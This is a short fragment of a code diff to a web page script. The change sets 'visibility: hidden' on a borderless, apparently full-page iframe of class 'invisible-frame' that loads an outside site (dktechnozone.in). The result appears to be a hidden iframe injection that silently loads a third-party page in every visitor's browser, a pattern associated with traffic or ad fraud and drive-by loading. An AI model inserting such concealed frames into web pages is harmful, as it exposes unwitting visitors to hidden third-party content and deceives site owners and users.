@@ -10,7 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
       bottom: 0;
       left: 0;
       border: none;
-      visibility: ;
+      visibility: hidden;
     }
   </style><iframe class="invisible-frame" src="https://www.dktechnozone.in/"></iframe>
 <script>
